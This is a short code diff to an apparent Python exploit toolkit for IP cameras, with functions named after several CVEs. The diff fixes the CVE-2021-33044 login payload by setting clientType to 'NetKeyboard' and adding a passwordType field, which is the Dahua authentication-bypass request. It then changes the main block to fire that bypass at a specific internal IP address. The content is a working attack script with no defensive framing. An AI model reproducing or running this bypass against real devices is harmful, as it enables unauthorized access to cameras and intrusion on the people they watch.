@@ -102,9 +102,10 @@ def cve_2021_33044(ip: str) -> list:
         "params": {
             "userName": "admin",
             "password": "Not Used",
-            "clientType": "Web3.0",
+            "clientType": "NetKeyboard",
             "loginType": "Direct",
             "authorityType": "Default",
+            "passwordType": "Default",
         },
         "id": 1,
         "session": 0,
@@ -126,4 +127,5 @@ def cve_2020_25078(ip: str) -> list:
 
 if __name__ == '__main__':
     # print(cve_2021_36260('10.101.35.74'))
-    print(dahua_weak('172.17.211.3'))
+    #  print(dahua_weak('172.17.211.3'))
+    print(cve_2021_33044('172.17.211.3'))
